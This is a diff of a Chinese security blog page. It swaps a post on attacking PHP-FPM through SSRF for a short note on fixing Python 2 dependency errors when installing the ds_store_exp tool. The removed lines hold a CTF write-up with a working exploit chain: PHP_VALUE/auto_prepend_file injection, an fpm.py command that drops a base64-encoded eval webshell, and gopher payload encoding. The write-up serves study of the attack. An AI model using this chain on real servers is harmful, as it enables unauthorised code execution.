@@ -4,12 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ssrf相关之攻击fastcgi, uf9n1x&#39;s blog">
-    <meta name="description" content="ssrf相关之攻击fastcgi
+    <meta name="keywords" content="杂记（一）, uf9n1x&#39;s blog">
+    <meta name="description" content="杂记（一）由安装DS_Store文件泄露处理工具引发的一系列问题
+安装ds_store_exp-master工具，下载解压之后需要先安装依赖包 cmd执行：**pip2 install ds-store requests** 发现报错：
 
-[toc]
-1.了解CGI、FastCGI、PHP-FPM我们知道，在网站架构中，Web Server（如Nginx）只是内容的分发者
-当客户端请求的是index.php，根据配置文件Web Server">
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ssrf相关之攻击fastcgi | uf9n1x&#39;s blog</title>
+    <title>杂记（一） | uf9n1x&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -298,12 +297,12 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ssrf相关之攻击fastcgi</h1>
+                    <h1 class="description center-align post-title">杂记（一）</h1>
                 </div>
             </div>
         </div>
@@ -327,8 +326,8 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/ssrf/">
-                                <span class="chip bg-color">ssrf</span>
+                            <a href="/tags/%E6%9D%82%E8%AE%B0/">
+                                <span class="chip bg-color">杂记</span>
                             </a>
                         
                     </div>
@@ -343,7 +342,7 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-31
+                    2022-09-26
                 </div>
                 
 
@@ -352,14 +351,14 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.6k
+                    563
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    10 分
+                    2 分
                 </div>
                 
 
@@ -374,162 +373,46 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="ssrf相关之攻击fastcgi"><a href="#ssrf相关之攻击fastcgi" class="headerlink" title="ssrf相关之攻击fastcgi"></a>ssrf相关之攻击fastcgi</h1><span id="more"></span>
-
-<p>[toc]</p>
-<h2 id="1-了解CGI、FastCGI、PHP-FPM"><a href="#1-了解CGI、FastCGI、PHP-FPM" class="headerlink" title="1.了解CGI、FastCGI、PHP-FPM"></a>1.了解CGI、FastCGI、PHP-FPM</h2><p>我们知道，在网站架构中，Web Server（如Nginx）只是内容的分发者</p>
-<p>当客户端请求的是index.php，根据配置文件Web Server辨别不是静态文件，此时就需要去找 PHP解析器来处理</p>
-<p>当Web Server收到 index.php 这个请求后，会启动对应的CGI 程序，也就是PHP解析器</p>
-<p>接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以CGI规范的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程</p>
-<p>这其中，引出如下概念：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">CGI</span>：是 Web Server 与 Web Application 之间数据交换的一种协议
-<span class="token operator">*</span><span class="token operator">*</span>FastCGI：<span class="token operator">*</span><span class="token operator">*</span>同 <span class="token constant">CGI</span>，是一种通信协议，对比 <span class="token constant">CGI</span> 提升了<span class="token number">5</span>倍以上性能
-<span class="token operator">*</span><span class="token operator">*</span><span class="token constant">PHP</span><span class="token operator">-</span><span class="token constant">CGI</span>：<span class="token operator">*</span><span class="token operator">*</span>是 <span class="token constant">PHP</span>（Web Application）对 Web Server 提供的 <span class="token constant">CGI</span> 协议的接口程序
-<span class="token operator">*</span><span class="token operator">*</span><span class="token constant">PHP</span><span class="token operator">-</span><span class="token constant">FPM</span>：<span class="token operator">*</span><span class="token operator">*</span>是 <span class="token constant">PHP</span>（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能的任务管理功能
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>PHP默认提供了很多种SAPI（服务器端应用编程端口），常见的提供给apache和nginx的php5_module、CGI、FastCGI，给IIS的ISAPI，以及Shell的CLI</p>
-<p>经过不断的技术升级，目前搭建高性能的PHP Web服务器，最佳的方式是Apache/Nginx + FastCGI + **PHP-FPM(PHP-CGI)**方式</p>
-<h3 id="FastCGI工作原理"><a href="#FastCGI工作原理" class="headerlink" title="FastCGI工作原理"></a>FastCGI工作原理</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">.</span>Web 服务器启动时载入FastCGI进程管理器（<span class="token constant">PHP</span><span class="token operator">-</span><span class="token constant">CGI</span>或者<span class="token constant">PHP</span><span class="token operator">-</span><span class="token constant">FPM</span><span class="token punctuation">)</span>
-<span class="token number">2</span><span class="token punctuation">.</span>FastCGI 进程管理器自身初始化，启动多个 <span class="token constant">CGI</span> 解释器进程，并等待来自 Web Server 的连接
-<span class="token number">3</span><span class="token punctuation">.</span>Web 服务器与 FastCGI 进程管理器进行 Socket 通信，选择一个<span class="token constant">CGI</span> 解释器进程，通过 FastCGI 协议发送 <span class="token constant">CGI</span> 环境变量和标准输入数据给 这个<span class="token constant">CGI</span> 解释器进程 
-<span class="token number">4</span><span class="token punctuation">.</span> <span class="token constant">CGI</span> 解释器进程完成处理后将标准输出和错误信息从同一连接返回 Web 服务器
-<span class="token number">5</span><span class="token punctuation">.</span><span class="token constant">CGI</span> 解释器进程接着等待并处理来自 Web 服务器的下一个连接
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>由此知道，PHP-FPM 就是一个FastCGI进程管理器，是对于 FastCGI 协议的具体实现，它负责管理一个进程池，来处理来自Web服务器的请求。</p>
-<h3 id="PHP-FPM通信方式"><a href="#PHP-FPM通信方式" class="headerlink" title="PHP-FPM通信方式"></a>PHP-FPM通信方式</h3><p>在PHP使用FastCGI连接模式的情况下，Web服务器中间件如Nginx和PHP-FPM之间的通信方式又分为两种，TCP模式和套接字(unix socket)模式</p>
-<pre class="line-numbers language-php"><code class="language-php">   <span class="token number">1</span><span class="token punctuation">.</span> <span class="token constant">TCP</span>模式即是<span class="token constant">PHP</span><span class="token operator">-</span><span class="token constant">FPM</span>进程会监听本机上的一个端口（默认为<span class="token number">9000</span>），然后Nginx会把客户端请求数据通过FastCGI协议传给<span class="token number">9000</span>端口，<span class="token constant">PHP</span><span class="token operator">-</span><span class="token constant">FPM</span>拿到数据后会调用<span class="token constant">CGI</span>进程解析
-   <span class="token number">2</span><span class="token punctuation">.</span> Unix套接字模式是Unix系统进程间通信（<span class="token constant">IPC</span>）的一种被广泛采用方式，以文件（一般是<span class="token punctuation">.</span>sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。上述原理图中提到的Socket 通信即为此模式
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><em><strong>利用SSRF漏洞攻击FastCGI是在TCP模式下进行</strong></em></p>
-<h2 id="2-FastCGI攻击原理"><a href="#2-FastCGI攻击原理" class="headerlink" title="2.FastCGI攻击原理"></a>2.FastCGI攻击原理</h2><h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">HTTP</span>协议是浏览器和服务器中间件进行数据交换的协议
-类比则有
-fastcgi协议是服务器中间件和某个语言后端（如<span class="token constant">PHP</span><span class="token operator">-</span><span class="token constant">FPM</span>）进行数据交换的协议
+                <h2 id="杂记（一）由安装DS-Store文件泄露处理工具引发的一系列问题"><a href="#杂记（一）由安装DS-Store文件泄露处理工具引发的一系列问题" class="headerlink" title="杂记（一）由安装DS_Store文件泄露处理工具引发的一系列问题"></a>杂记（一）由安装DS_Store文件泄露处理工具引发的一系列问题</h2><ol>
+<li><p>安装ds_store_exp-master工具，下载解压之后需要先安装依赖包 cmd执行：**<code>pip2 install ds-store requests</code>** 发现报错：</p>
+<span id="more"></span></li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/79f397534d1b4e729935ab613aaf2e0d.png" alt="1"></p>
+<p>搜索该报错发现是因为pip工具早就停止了对python2的更新支持，因此安装的python2中是不带有pip工具的，那就通过setuptools工具安装一个：</p>
+<pre class="line-numbers language-php"><code class="language-php">https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//pypi.python.org/packages/source/s/setuptools/setuptools-0.6c11.tar.gz</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>下载后解压进入目录内，使用命令<code>**python2 setup.py install**</code>进行安装，这里一定要注意需要<code>管理员权限</code>，等待一会后，安装即可完成。</p>
+<p>安装完成之后，再下载pip进行安装，这里使用pip19,下载后安装方式和刚刚安装setuptools的方法相同。</p>
+<pre class="line-numbers language-php"><code class="language-php">https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//files.pythonhosted.org/packages/11/31/c483614095176ddfa06ac99c2af4171375053b270842c7865ca0b4438dc1/pip-19.0.tar.gz</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ol start="2">
+<li>pip安装完成之后，再次进行依赖包安装：<code>pip2 install ds-store requests</code></li>
+</ol>
+<p>发现又报错：</p>
+<p><img src="https://img-blog.csdnimg.cn/5d9cd06b07a04db288b9f3c25ed15878.png" alt="2"></p>
+<p>查看报错信息，发现是编码问题，这是因为python安装依赖包时会加载用户目录，而我的目录中有中文，因此出现编码错误</p>
+<p>解决办法：找到<code>python安装目录 Python27\Lib\目录下的mimetypes.py文件</code>，添加以下三行代码，更改编码方式即可解决：(注意二三行空格以及gbk包裹引号为英文符)</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">if</span> sys<span class="token punctuation">.</span>getdefaultencoding<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'gbk'</span><span class="token punctuation">:</span> 
+ reload<span class="token punctuation">(</span>sys<span class="token punctuation">)</span> 
+ sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端（PHP-FPM），语言后端（PHP-FPM）解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件</p>
-<p>record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p>
-<pre class="line-numbers language-php"><code class="language-php">typedef struct <span class="token punctuation">{</span>
-  <span class="token comment" spellcheck="true">/* Header */</span>
-  unsigned char version<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 版本</span>
-  unsigned char type<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 本次record的类型</span>
-  unsigned char requestIdB1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 本次record对应的请求id</span>
-  unsigned char requestIdB0<span class="token punctuation">;</span>
-  unsigned char contentLengthB1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// body体的大小</span>
-  unsigned char contentLengthB0<span class="token punctuation">;</span>
-  unsigned char paddingLength<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 额外块大小</span>
-  unsigned char reserved<span class="token punctuation">;</span> 
-
-  <span class="token comment" spellcheck="true">/* Body */</span>
-  unsigned char contentData<span class="token punctuation">[</span>contentLength<span class="token punctuation">]</span><span class="token punctuation">;</span>
-  unsigned char paddingData<span class="token punctuation">[</span>paddingLength<span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span> FCGI_Record<span class="token punctuation">;</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-php"><code class="language-php">语言端（<span class="token constant">PHP</span><span class="token operator">-</span><span class="token constant">FPM</span>）解析了FastCGI头以后，拿到contentLength，然后再在<span class="token constant">TCP</span>流里读取大小等于contentLength的数据，这就是body体
-
-Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用不需要该Padding的时候，将其长度设置为<span class="token number">0</span>即可
-
-可见，一个FastCGI record结构最大支持的body大小是<span class="token number">2</span><span class="token operator">^</span><span class="token number">16</span>，也就是<span class="token number">65536</span>字节
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>其中，header中的type代表本次record的类型，所有值及具体含义如下</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/ac1f34c80faaa9450f24b596e4329ecd.png"></p>
-<p>服务器中间件和后端语言（PHP-FPM）通信，第一个数据包就是type为1的record，后续互相交流，发送type为4、5、6、7的record，结束时发送type为2、3的record</p>
-<p>举个例子，用户访问<a target="_blank" rel="noopener" href="http://127.0.0.1/index.php?a=1&amp;b=2%EF%BC%8C%E5%A6%82%E6%9E%9Cweb%E7%9B%AE%E5%BD%95%E6%98%AF/var/www/html%EF%BC%8C%E9%82%A3%E4%B9%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6%EF%BC%88Nginx%EF%BC%89%E4%BC%9A%E5%B0%86%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E5%8F%98%E6%88%90%E5%A6%82%E4%B8%8Bkey-value%E5%AF%B9%EF%BC%9A">http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是/var/www/html，那么服务器中间件（Nginx）会将这个请求变成如下key-value对：</a></p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token punctuation">{</span>
-    <span class="token string">'GATEWAY_INTERFACE'</span><span class="token punctuation">:</span> <span class="token string">'FastCGI/1.0'</span><span class="token punctuation">,</span>
-    <span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>
-    <span class="token string">'SCRIPT_FILENAME'</span><span class="token punctuation">:</span> <span class="token string">'/var/www/html/index.php'</span><span class="token punctuation">,</span>
-    <span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">:</span> <span class="token string">'/index.php'</span><span class="token punctuation">,</span>
-    <span class="token string">'QUERY_STRING'</span><span class="token punctuation">:</span> <span class="token string">'?a=1&amp;b=2'</span><span class="token punctuation">,</span>
-    <span class="token string">'REQUEST_URI'</span><span class="token punctuation">:</span> <span class="token string">'/index.php?a=1&amp;b=2'</span><span class="token punctuation">,</span>
-    <span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">:</span> <span class="token string">'/var/www/html'</span><span class="token punctuation">,</span>
-    <span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">:</span> <span class="token string">'php/fcgiclient'</span><span class="token punctuation">,</span>
-    <span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>
-    <span class="token string">'REMOTE_PORT'</span><span class="token punctuation">:</span> <span class="token string">'12345'</span><span class="token punctuation">,</span>
-    <span class="token string">'SERVER_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>
-    <span class="token string">'SERVER_PORT'</span><span class="token punctuation">:</span> <span class="token string">'80'</span><span class="token punctuation">,</span>
-    <span class="token string">'SERVER_NAME'</span><span class="token punctuation">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>
-    <span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">:</span> <span class="token string">'HTTP/1.1'</span>
-<span class="token punctuation">}</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉FPM：“我要执行哪个PHP文件”</p>
-<p>当后端语言（PHP-FPM）拿到由Nginx发过来的FastCGI数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php</p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>到这里，PHP-FPM FastCGI未授权访问漏洞也就呼之欲出了。PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造FastCGI协议，和FPM进行通信。</p>
-<p>此时，我们自行构造SCRIPT_FILENAME的值，就可以控制PHP-FPM执行任意后缀文件，如/etc/passwd</p>
-<p>但是，在PHP5.3.9之后，FPM默认配置中增加了security.limit_extensions选项</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token punctuation">;</span> Limits the extensions of the main script <span class="token constant">FPM</span> will allow to parse<span class="token punctuation">.</span> This can
-<span class="token punctuation">;</span> prevent configuration mistakes on the web server side<span class="token punctuation">.</span> You should only limit
-<span class="token punctuation">;</span> <span class="token constant">FPM</span> to <span class="token punctuation">.</span>php extensions to prevent malicious users to <span class="token keyword">use</span> <span class="token package">other</span> extensions to
-<span class="token punctuation">;</span> exectute php code<span class="token punctuation">.</span>
-<span class="token punctuation">;</span> Note<span class="token punctuation">:</span> set an empty value to allow all extensions<span class="token punctuation">.</span>
-<span class="token punctuation">;</span> <span class="token keyword">Default</span> Value<span class="token punctuation">:</span> <span class="token punctuation">.</span>php
-<span class="token punctuation">;</span>security<span class="token punctuation">.</span>limit_extensions <span class="token operator">=</span> <span class="token punctuation">.</span>php <span class="token punctuation">.</span>php3 <span class="token punctuation">.</span>php4 <span class="token punctuation">.</span>php5 <span class="token punctuation">.</span>php7
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>其限定了只有某些后缀的文件允许被FPM执行，默认是.php。</p>
-<p>因此，想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。已存在的PHP文件名获得有两种方法：</p>
-<pre class="line-numbers language-php"><code class="language-php">通过系统的信息收集、爆破、报错获得某个<span class="token constant">PHP</span>文件名及其路径
-找安装<span class="token constant">PHP</span>后默认存在的<span class="token constant">PHP</span>文件，如<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span><span class="token constant">PEAR</span><span class="token punctuation">.</span>php
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>现在，拿到了文件名，我们能控制SCRIPT_FILENAME，却只能执行目标服务器上的文件，并不能执行我们想要执行的任意代码，但我们可以通过构造type值为4的record，也就是设置向PHP-FPM传递的环境变量来达到任意代码执行的目的</p>
-<p>PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file</p>
-<pre class="line-numbers language-php"><code class="language-php">auto_prepend_file是告诉<span class="token constant">PHP</span>，在执行目标文件之前，先包含auto_prepend_file中指定的文件
-auto_append_file是告诉<span class="token constant">PHP</span>，在执行完成目标文件后，包含auto_append_file指向的文件
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>若我们设置auto_prepend_file为php://input（allow_url_include=on），那么就等于在执行任何PHP文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在FastCGI协议 Body中，它们就能被执行了</p>
-<p>那么我们如何设置PHP.INI中auto_prepend_file的值呢？</p>
-<p>我们可以通过PHP-FPM的两个环境变量，PHP_VALUE PHP_ADMIN_VALUE来设置PHP.INI</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/8adf44713497c38ffb6fc3554b2fae65.png"></p>
-<p>最终，我们设置向PHP-FPM传递的环境变量：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token punctuation">{</span>
-    <span class="token string">'GATEWAY_INTERFACE'</span><span class="token punctuation">:</span> <span class="token string">'FastCGI/1.0'</span><span class="token punctuation">,</span>
-    <span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>
-    <span class="token string">'SCRIPT_FILENAME'</span><span class="token punctuation">:</span> <span class="token string">'/var/www/html/index.php'</span><span class="token punctuation">,</span>
-    <span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">:</span> <span class="token string">'/index.php'</span><span class="token punctuation">,</span>
-    <span class="token string">'QUERY_STRING'</span><span class="token punctuation">:</span> <span class="token string">'?a=1&amp;b=2'</span><span class="token punctuation">,</span>
-    <span class="token string">'REQUEST_URI'</span><span class="token punctuation">:</span> <span class="token string">'/index.php?a=1&amp;b=2'</span><span class="token punctuation">,</span>
-    <span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">:</span> <span class="token string">'/var/www/html'</span><span class="token punctuation">,</span>
-    <span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">:</span> <span class="token string">'php/fcgiclient'</span><span class="token punctuation">,</span>
-    <span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>
-    <span class="token string">'REMOTE_PORT'</span><span class="token punctuation">:</span> <span class="token string">'12345'</span><span class="token punctuation">,</span>
-    <span class="token string">'SERVER_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>
-    <span class="token string">'SERVER_PORT'</span><span class="token punctuation">:</span> <span class="token string">'80'</span><span class="token punctuation">,</span>
-    <span class="token string">'SERVER_NAME'</span><span class="token punctuation">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>
-    <span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">:</span> <span class="token string">'HTTP/1.1'</span>
-    <span class="token string">'PHP_VALUE'</span><span class="token punctuation">:</span> 'auto_prepend_file <span class="token operator">=</span> php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input',</span>
-    <span class="token string">'PHP_ADMIN_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'allow_url_include = On'</span>
-<span class="token punctuation">}</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>最后两行设置auto_prepend_file = php://input且allow_url_include = On，然后将我们需要执行的代码放在Body中，即可执行任意代码（见文章开头漏洞复现）</p>
-<h2 id="3-SSRF攻击本地的PHP-FPM"><a href="#3-SSRF攻击本地的PHP-FPM" class="headerlink" title="3.SSRF攻击本地的PHP-FPM"></a>3.SSRF攻击本地的PHP-FPM</h2><p>生产环境中，除非测试或者图方便之外，PHP-FPM是极少开放在公网的，绝大部分都是启动在本地即监听127.0.0.1:9000地址，这种情况下，如果服务器端存在SSRF漏洞，那么我们就可以借助SSRF来攻击本地PHP-FPM服务，达到任意代码执行的效果</p>
-<p>我们通过CTFHub中的一道SSRF FastCGI协议题目具体进行利用</p>
-<p>根据前面几篇SSRF系列的文章，我们对gopher协议已经有所了解</p>
-<pre class="line-numbers language-php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span></span><span class="token operator">/</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>gopher-path</span><span class="token punctuation">></span></span></span>_后接<span class="token constant">TCP</span>数据流
+<p><img src="https://img-blog.csdnimg.cn/0b8ba2b10a7047c7a7878121e46bf171.png" alt="3"></p>
+<p>修改保存之后即可解决报错</p>
+<ol start="3">
+<li>之后运行安装依赖包命令，又遇到报错：<code>xxx文件报错：ImportError: No module named queue</code></li>
+</ol>
+<p>这是因为环境中同时存在python2和python3引起的兼容性问题</p>
+<p>Python3中要这样引入：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> queue
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>当后接TCP数据流为我们构造的恶意FastCGI协议报文，即可执行恶意命令</p>
-<p>根据前文的FastCGI攻击原理分析，我们需要满足三个条件：</p>
-<pre><code>PHP版本要高于5.3.3，才能动态修改PHP.INI配置文件（题目环境已满足）
-知道题目环境中的一个PHP文件的绝对路径
-PHP-FPM监听在本机9000端口（题目环境已满足）
-</code></pre>
-<p>打开题目链接，我们访问index.php会被重定向，其他任意PHP文件都返回404，说明存在index.php</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">PHP</span>文件的绝对路径<span class="token punctuation">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>php
+<p>Python2中要这样引入：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> Queue
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>所需条件都满足，我们利用题目附件中P牛的EXP:fpm.php</p>
-<p>我们在本机监听9000端口，然后运行fpm.py将恶意FastCGI协议报文数据打在本机的9000端口，保存为exp.txt</p>
-<h1 id="监听9000端口"><a href="#监听9000端口" class="headerlink" title="监听9000端口"></a>监听9000端口</h1><pre class="line-numbers language-python"><code class="language-python">nc <span class="token operator">-</span>lvvp <span class="token number">9000</span> <span class="token operator">></span> exp<span class="token punctuation">.</span>txt
-
-<span class="token comment" spellcheck="true"># 运行`fpm.py`</span>
-
-python3 fpm<span class="token punctuation">.</span>py <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>php <span class="token operator">-</span>c <span class="token string">"&lt;?php system('echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk 7Pz4 | base64 -d > /var/www/html/shel1.php');die('-----made by pniu----- ');?>"</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>编写exp_urlcode.py将exp.txt进行urlencode编码并输出</p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> quote
-<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'exp.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-    pld <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span> <span class="token string">"gopher://127.0.0.1:9000/_"</span> <span class="token operator">+</span> quote<span class="token punctuation">(</span>pld<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>然后进行二次编码后将最终的payload内容放到?url=后面发送过去（这里需要进行两次编码，因为这里GET会进行一次解码，curl也会再进行一次解码）</p>
-<p>使用中国蚁剑成功连接webshell，在其根目录下即可找到flag</p>
-<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>gopher工具生成payload</p>
-<p>与方法一一样，将payload二次编码后发送，然后中国蚁剑成功连接webshell，在其根目录下即可找到flag</p>
+<p>因此只需要找到报错文件，将导入模块queue更改成Queue即可解决。更改之后再执行依赖包安装命令，发现成功安装。</p>
+<p><img src="https://img-blog.csdnimg.cn/28cf3700c1fb4253a8ed3f01b624e4c9.png" alt="4"></p>
+<p><strong>总结：</strong></p>
+<p>1.因为pip已经停止对python2的更新支持，所以安装python2中并不自带pip工具，需要使用的话需通过setuptools自行安装。</p>
+<p>2.电脑中同时存在python2与python3经常会造成一些兼容性问题，这很常见，因此不必慌张，查看对应的python特性文档即可解决。</p>
 
                 
             </div>
@@ -556,7 +439,7 @@ python3 fpm<span class="token punctuation">.</span>py <span class="token number"
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://uf9n1x.top/2022/03/31/ssrf-xiang-guan-zhi-gong-ji-fastcgi/">https://uf9n1x.top/2022/03/31/ssrf-xiang-guan-zhi-gong-ji-fastcgi/</a>
+                    <a href="https://uf9n1x.top/2022/09/26/za-ji-yi/">https://uf9n1x.top/2022/09/26/za-ji-yi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -594,8 +477,8 @@ python3 fpm<span class="token punctuation">.</span>py <span class="token number"
                     
                         <div class="article-tag">
